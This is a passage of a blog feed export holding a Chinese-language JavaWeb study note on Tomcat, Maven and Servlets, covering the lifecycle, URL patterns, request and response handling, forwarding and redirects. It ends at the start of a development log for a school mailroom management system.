class="hljs-string">&quot;learning&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>还有引入的方式</p><p><img src="https://img-blog.csdnimg.cn/3ac0df5eea384c418d536c5019fcc753.png" alt="import的方式"></p>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb</title>
    <link href="/2022/08/21/JavaWeb/"/>
    <url>/2022/08/21/JavaWeb/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>Tomcat用于搭建我们本机的服务器，我们可以部署javaweb项目到Tomcat中，然后其他用于就可以在浏览器中浏览</p><h2 id="1-下载，安装"><a href="#1-下载，安装" class="headerlink" title="1.下载，安装"></a>1.下载，安装</h2><p>我们到Tomcat的官网中下载就可以了 &lt;<a href="https://tomcat.apache.org/">Apache Tomcat® - Welcome!</a>&gt;</p><p>我选择的是8版本，下载压缩包，然后解压就完成了下载和安装</p><p>然后点击<code>bin</code>目录下的<code>startup.bat</code>就可以开始运行，在浏览器中进入本地8080端口就可以看到页面</p><p>如果出现中文乱码，那就在conf文件夹下找到<code>logging.properties</code>这个文件</p><p>更改编码格式：（原为UTF-8）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.ConsoleHandler</span><span class="hljs-selector-class">.encoding</span> = GBK<br></code></pre></td></tr></table></figure><p>打开后可以使用Ctrl+C关闭</p><h2 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h2><p><img src="https://s2.loli.net/2022/09/04/WycgwUYSbGOfEzk.png" alt="端口.png"></p><p>项目部署的时候直接放在webapps这个目录下就算部署成功，在端口号下输入路径就可以看到</p><p>我们部署项目一般会将文件夹打包成<code>war</code>包的格式，<code>war</code>包放入部署文件夹之后会自动解压缩</p><h2 id="3-项目结构"><a href="#3-项目结构" class="headerlink" title="3.项目结构"></a>3.项目结构</h2><p>web项目结构中主要是增加了webapp这个目录，然后就是WEB-INF中的配置文件。</p><p>然后在pom.xml中需要配置使用war方式打包</p><p><img src="https://s2.loli.net/2022/09/04/IJjv4fVehPNTXFu.png" alt="web项目结构.png"></p><h2 id="4-创建maven项目"><a href="#4-创建maven项目" class="headerlink" title="4.创建maven项目"></a>4.创建maven项目</h2><p>有两种方式</p><p>1.使用骨架</p><p><img src="https://s2.loli.net/2022/09/04/yr98fed5gJ7EFWk.png" alt="骨架创建.png"></p><p>但是会有很多杂项配置，所以不建议使用</p><p>2.不使用骨架</p><p><img src="https://s2.loli.net/2022/09/04/6EgNOZnM45zTmKB.png" alt="非骨架创建.png"></p><p>这样我们的pom.xml文件中的内容就比较清爽，但是需要使用<code>Ctrl+Shift+Alt+s</code>打开facets补齐</p><p>运行时我们也有两种方式</p><p>1.是集成本地的Tomcat，但是较为繁琐</p><p>2.idea为我们提供了插件，我们可以使用插件快捷集成，但是只支持到Tomcat7版本</p><p><img src="https://s2.loli.net/2022/09/04/NmEvZifcIBDr3Mb.png" alt="maven中加入Tomcat.png"></p><h1 id="Servelet"><a href="#Servelet" class="headerlink" title="Servelet"></a>Servelet</h1><p>servelet用于实现对动态资源的管理和响应</p><p>比如我们登录携带的参数，servelet就适用于对于不同的参数进行响应</p><p>serverlet是javaee的规范之一，也就是一个接口</p><h2 id="1-简单使用"><a href="#1-简单使用" class="headerlink" title="1.简单使用"></a>1.简单使用</h2><p><img src="https://s2.loli.net/2022/09/04/8nK3lEHZGeOUN9s.png" alt="简单使用.png"></p><p>首先在<code>pom.xml</code>中加入Tomcat和servelet</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--    servlet依赖--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--    tomcat 插件--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后实现servelet接口，记得在service的方法处配置访问路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.Servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/demo1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Servlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br><span class="hljs-comment">//    servlet 被访问时触发</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet hello world&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getServletInfo</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后我们进去8080端口下<code>servelet/demo1</code></p><p>访问这个页面我们虽然看不到任何东西，但是我们idea的控制台就会输出<code>servelet hello world</code></p><h2 id="2-生命周期"><a href="#2-生命周期" class="headerlink" title="2.生命周期"></a>2.生命周期</h2><p><img src="https://s2.loli.net/2022/09/04/cqhP5gwxFstI3Nz.png" alt="生命周期.png"></p><p>首先第一个是init，初始化方法</p><p>调用时机是servelet第一次被访问时，调用次数就只有一次</p><p>可以在<code>@webServlet</code>中修改触发时间，如果<code>loadOnStartup = -1</code>（默认值）就是访问时才触发，如果<code>loadOnStartup = 1（正整数）</code>就是服务器开启就触发</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">@<span class="hljs-constructor">WebServlet(<span class="hljs-params">urlPatterns</span> = <span class="hljs-string">&quot;/demo1&quot;</span> ,<span class="hljs-params">loadOnStartup</span> = 1)</span><br></code></pre></td></tr></table></figure><p>还有<code>service</code>周期，就是浏览器每一次访问时调用，调用次数是多次</p><p>然后是<code>destroy</code>方法，在释放资源和服务器关闭的时候，也就是销毁servelet对象的时候触发</p><p>一般是打开控制台使用<code>Ctrl+C</code></p><p>还有一个<code>getServletInfo</code>这个是获取一些版权信息的，一般<code>return null</code></p><p>然后就是<code>getServletConfig</code>用于获取配置对象，配置对象在init方法中作为参数传入，所以我们这里要使用init方法中的局部变量</p><p>于是这样做：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">    ServletConfig config;<br>    @<span class="hljs-function">Override</span><br><span class="hljs-function">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> throws ServletException </span>&#123;<br>        <span class="hljs-comment">//设置了loadOnStartup，服务器开启就传递数据</span><br>        <span class="hljs-comment">//成员变量赋值</span><br>        <span class="hljs-keyword">this</span>.config = servletConfig;<br>    &#125;<br><br><span class="hljs-comment">//    返回配置对象</span><br>    @<span class="hljs-function">Override</span><br><span class="hljs-function">    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.config;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/04/orKT48evUYl6XZO.png" alt="servelet生命周期函数.png"></p><h2 id="3-体系结构"><a href="#3-体系结构" class="headerlink" title="3.体系结构"></a>3.体系结构</h2><p>Serverlet作为接口有很多的实现类，提供更强大的功能</p><p><img src="https://s2.loli.net/2022/09/04/InaLCDdqG4TVtX8.png" alt="servelet体系结构.png"></p><p>我们使用<code>HttpServlet</code>对于我们的get和post请求进行response</p><p>get请求直接就是在url后面跟参数</p><p>post请求则是需要添加到body中，比如使用form表单</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;<br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-string">&quot;get ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;<br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-string">&quot;post ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-URL配置"><a href="#4-URL配置" class="headerlink" title="4.URL配置"></a>4.URL配置</h2><p>首先我们的一个servelet可以配置多个URLpattern使用逗号间隔</p><p><code>@WebServlet(urlPatterns = &quot;/demo1,/demo2&quot; ,loadOnStartup = 1)</code></p><p>还有一些配置规则，我们现在使用的就是精确匹配</p><p>还有三种配置规则实现多url的归一问题</p><p>而且越精确的匹配规则，优先级越高，同时满足目录匹配和精确匹配就使用精确匹配的url</p><p><img src="https://s2.loli.net/2022/09/04/37nhHRgweNsXdko.png" alt="servelet url配置.png"></p><h2 id="5-response和request对象"><a href="#5-response和request对象" class="headerlink" title="5.response和request对象"></a>5.response和request对象</h2><p>在service函数中有两个参数res和resp，分别作为获取请求的对象和设置返回数据的对象</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">    protected void <span class="hljs-keyword">do</span><span class="hljs-constructor">Get(HttpServletRequest <span class="hljs-params">req</span>, HttpServletResponse <span class="hljs-params">resp</span>)</span> throws ServletException, IOException &#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;get ...&quot;</span>);<br><span class="hljs-comment">//  获取name参数中的数据</span><br>        String name = req.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;name&quot;</span>)</span>;<br><span class="hljs-comment">//  使用response对象</span><br>        resp.set<span class="hljs-constructor">Header(<span class="hljs-string">&quot;content-type&quot;</span>,<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>)</span>;<br>        resp.get<span class="hljs-constructor">Writer()</span>.write(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span>+name+<span class="hljs-string">&quot;欢迎你! &lt;/h1&gt;&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="5-1-request"><a href="#5-1-request" class="headerlink" title="5.1 request"></a>5.1 request</h3><p>request处理浏览器发给服务器的报文</p><p>获取请求行的数据，有以下几个常用的方法</p><p><img src="https://s2.loli.net/2022/09/04/fPR9nMxGieF1JOh.png" alt="request方法.png"></p><p>还有此处使用的根据参数的名字获取里面的数据的方法</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String name = req.getParameter(<span class="hljs-string">&quot;name&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>还有请求头和请求体</p><p><img src="https://s2.loli.net/2022/09/04/zFvolEhmIegxb2C.png" alt="request可以获取的数据.png"></p><p>请求体代表使用的是post请求</p><p>获取了之后是字符输入流（如果是图片是字节输入流），进行readline</p><p><img src="https://s2.loli.net/2022/09/04/oI9lKJ7MysVk8gh.png" alt="req获取请求体.png"></p><p>获取请求参数时，原本获取的是字符串<code>javaweb = 1&amp;...</code></p><p>get使用：</p><p><code>String getQueryString()</code></p><p>post使用：</p><p><code>BufferedReader getReader()</code></p><p>但是如果我们post和get请求有大量重复的代码，我们就可以在doPost中调用doGet方法，然而这种实现的前提就是要统一请求参数的函数</p><p>在request中我们就使用泛型的Map，键值对的方式，当一个键有多个值的时候就会形成一个<code>String[]</code>数组。</p><p>servelet为我们封装了三个方法获取参数:</p><p><img src="https://s2.loli.net/2022/09/04/aJoEIAzYR62HVCj.png" alt="request获取请求参数.png"></p><p>因为是通用的获取参数的方法，<strong>所以现在就可以在doPost中调用doGet了</strong></p><p>idea中就给我们准备了servelet的模板，点击新建，选择new一个servelet就可以了</p><p>如果有中文乱码问题</p><p>1.post请求</p><p>要先使用<code>req.setCharacterEncoding(&quot;UTF-8&quot;);</code>，设置字符输入流的编码格式</p><p>然后再获取参数</p><p>2.get请求</p><p>get请求的中文编码字符集是utf-8，但是Tomcat的解码字符集是iso，所以为出现乱码</p><p>先编码再解码：</p><p>使用<code>new String(username.getBytes(&quot;ISO-8859-1&quot;),&quot;UTF-8&quot;);</code></p><p>请求转发问题</p><p>当我们得到一个需要在服务器内进行转发的请求时（既需要在服务器内部再发一次请求）</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">//  请求转发</span><br>        <span class="hljs-selector-tag">req</span><span class="hljs-selector-class">.getRequestDispatcher</span>(<span class="hljs-string">&quot;/demo1&quot;</span>)<span class="hljs-selector-class">.forward</span>(req,resp);<br></code></pre></td></tr></table></figure><p>此时这个请求就被转发到了demo1中又进行一遍处理</p><p>通过这个我们还可以做到共享资源</p><p>在demo2的servelet中设置资源，需要注意这里资源的类型是object</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>  设置资源<br><span class="hljs-regexp">//</span>        增加新资源，hello是object类型<br>        req.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-regexp">//</span>  请求转发<br>        req.getRequestDispatcher(<span class="hljs-string">&quot;/demo3&quot;</span>).forward(req,resp);<br></code></pre></td></tr></table></figure><p>转发给demo3，在demo3中获取资源</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">Object <span class="hljs-meta">message</span> = request.getAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br>System.<span class="hljs-meta">out</span>.print<span class="hljs-meta">ln(</span><span class="hljs-meta">message</span>);<br></code></pre></td></tr></table></figure><p>还可以删除资源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>        删除资源<br>        req.removeAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="5-2-response对象"><a href="#5-2-response对象" class="headerlink" title="5.2 response对象"></a>5.2 response对象</h3><p><img src="https://s2.loli.net/2022/09/04/1rAOgdpHS2LcsMi.png" alt="response对象方法.png"></p><p>字符输出用于html页面等，字节输出用于图片等字节文件</p><h4 id="1-重定向"><a href="#1-重定向" class="headerlink" title="1.重定向"></a>1.重定向</h4><p>也是转发请求的方式，实现两个资源的跳转</p><p>302的状态码就是代表重定向</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">resp</span><span class="hljs-selector-class">.setStatus</span>(<span class="hljs-number">302</span>);<br><span class="hljs-selector-tag">resp</span><span class="hljs-selector-class">.setHeader</span>(<span class="hljs-string">&quot;location&quot;</span>,<span class="hljs-string">&quot;资源B的路径&quot;</span>);<br></code></pre></td></tr></table></figure><p>还有简化方式</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">resp</span><span class="hljs-selector-class">.sendRedirect</span>(<span class="hljs-string">&quot;路径&quot;</span>)<br></code></pre></td></tr></table></figure><p>重定向有点类似于页面跳转，在触发重定向之后会导致页面跳转</p><p>而且会触发两次请求</p><p>而且重定向需要添加虚拟目录</p><p>关于虚拟目录是否需要添加有一个简单的判断标准</p><p>1.如果是在服务器内部使用—forword跳转转发</p><p>​    就不需要虚拟目录</p><p>2.如果是在浏览器中使用—重定向</p><p>​    就需要添加虚拟目录</p><p>我们还可以动态获取虚拟目录</p><p>使用<code>request.getContextPath()</code>就可以动态获取虚拟目录</p><h4 id="2-响应字符字节"><a href="#2-响应字符字节" class="headerlink" title="2.响应字符字节"></a>2.响应字符字节</h4><p>我们使用writer获取写入对象</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//        设置识别html页面</span><br>        response.set<span class="hljs-constructor">Header(<span class="hljs-string">&quot;Content&quot;</span>,<span class="hljs-string">&quot;text/html&quot;</span>)</span>;<br>        PrintWriter writer = response.get<span class="hljs-constructor">Writer()</span>;<br>        writer.write(<span class="hljs-string">&quot;&lt;h1&gt;abc&lt;/h1&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><p>如果输出html页面有问题就可以加上这段代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>        设置识别html页面<br>        response.setHeader(<span class="hljs-string">&quot;Content&quot;</span>,<span class="hljs-string">&quot;text/html&quot;</span>);<br></code></pre></td></tr></table></figure><p>如果出现中文乱码就使用<code>setContentType</code>设置字符集</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">        response.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br><span class="hljs-regexp">//</span>        设置识别html页面<br><span class="hljs-regexp">//</span>        response.setHeader(<span class="hljs-string">&quot;Content&quot;</span>,<span class="hljs-string">&quot;text/html&quot;</span>);<br>        PrintWriter writer = response.getWriter();<br>        writer.write(<span class="hljs-string">&quot;你好&quot;</span>);<br>        writer.write(<span class="hljs-string">&quot;&lt;h1&gt;abc&lt;/h1&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><p>字符流不需要关闭</p><p>响应字节流</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//        设置字节数据</span><br><br><span class="hljs-comment">//        读取文件</span><br>        FileInputStream fls = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FileInputStream</span>(<span class="hljs-string">&quot;D:\\新建文件夹\\文件\\GitHub\\pic\\ajax\\http请求报文.png&quot;</span>);<br><span class="hljs-comment">//        获取response的输出流</span><br>        ServletOutputStream os =response.<span class="hljs-built_in">getOutputStream</span>();<br><span class="hljs-comment">//        完成流的copy</span><br>        <span class="hljs-keyword">byte</span>[] buff = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>((len = fls.<span class="hljs-built_in">read</span>(buff)) != <span class="hljs-number">-1</span>)&#123;<br>            os.<span class="hljs-built_in">write</span>(buff,<span class="hljs-number">0</span>,len);<br>        &#125;<br><br><span class="hljs-comment">//        关闭流</span><br>        fls.<span class="hljs-built_in">close</span>();<br></code></pre></td></tr></table></figure><p>这样就可以获取图片等资源</p><p>关于字节流的复制</p><p>我们可以使用 <code>commons-io</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后使用<code>IOUtils</code>的<code>copy</code>方法放入输入流和输出流</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">IOUtils</span>.</span></span>copy(fls,os);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学校收发系统开发日志</title>
    <link href="/2022/07/14/%E6%94%B6%E5%8F%91%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/"/>
    <url>/2022/07/14/%E6%94%B6%E5%8F%91%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<h1 id="收发系统开发日志"><a href="#收发系统开发日志" class="headerlink" title="收发系统开发日志"></a>收发系统开发日志</h1><p>相信每个学校都有一个收发室，而收发室每天要处理大量的信件和杂志，为了处理这些书信的收发功能，我们开发了收发系统。</p><p>实现：1.对收到书籍的统计    2.对于用户的管理    3.对于分发书籍的管理</p><h2 id="1-用户管理页面"><a href="#1-用户管理页面" class="headerlink" title="1.用户管理页面"></a>1.用户管理页面</h2><p>页面的大致结构是这样：:bow: 主要是实现为用户的改删查</p><p><img src="https://s2.loli.net/2022/07/14/A7dS58YPlZwzckv.png" alt="用户管理页面.png"></p><h3 id="1-1-查询功能"><a href="#1-1-查询功能" class="headerlink" title="1.1 查询功能"></a>1.1 查询功能</h3><p>还有一堆堆样式就不贴过来惹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 筛选框 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u39&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ax_default box_1&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u39_div&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u41&quot;</span>&gt;</span>姓<span class="hljs-symbol">&amp;nbsp;</span> 名：<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">el-input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;姓名&quot;</span> <span class="hljs-attr">id</span>=<span 